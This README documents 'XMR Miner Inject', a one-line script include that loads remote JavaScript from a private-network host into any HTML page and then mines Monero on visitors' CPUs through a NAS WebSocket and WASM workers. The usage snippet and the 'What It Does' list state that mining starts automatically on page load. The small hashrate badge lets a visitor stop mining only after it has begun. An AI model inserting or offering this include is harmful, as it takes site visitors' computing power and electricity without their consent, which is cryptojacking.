# XMR Miner Inject

Drop-in script that adds XMR mining to any HTML page. Just add one line to your HTML and it auto-mines.

## Usage

```html
<script src="https://192.168.50.235:8443/inject/xmr-inject.js"></script>
```

Or with custom wallet/workers:

```html
<script src="https://192.168.50.235:8443/inject/xmr-inject.js?wallet=YOUR_WALLET&workers=8"></script>
```

## What It Does

1. Loads automatically when the page loads
2. Connects to your NAS WebSocket
3. Spawns WASM JIT workers
4. Mines XMR using the visitor's CPU
5. Shows a small badge in bottom-right corner with live hashrate

## Files

Place these next to your HTML:

```
your-page.html
xmr-inject.js    ← the script
worker.js        ← required by the script
randomx_fast.js  ← JIT engine
vm.wasm          ← RandomX VM
dataset.wasm     ← Cache init
fma.wasm         ← FMA detection
simd.wasm        ← SIMD validation
```

All the WASM/JS files come from the `public/` folder of the main repo.

## Parameters

| Param | Default | Purpose |
|-------|---------|---------|
| `wallet` | (built-in) | Your XMR wallet address |
| `nas` | `ws://192.168.50.235:8088` | NAS WebSocket URL |
| `workers` | cores - 1 (max 8) | Number of mining workers |

## Badge

A small badge appears in the bottom-right corner showing:
- Live hashrate
- Accepted/rejected shares
- Click to start/stop mining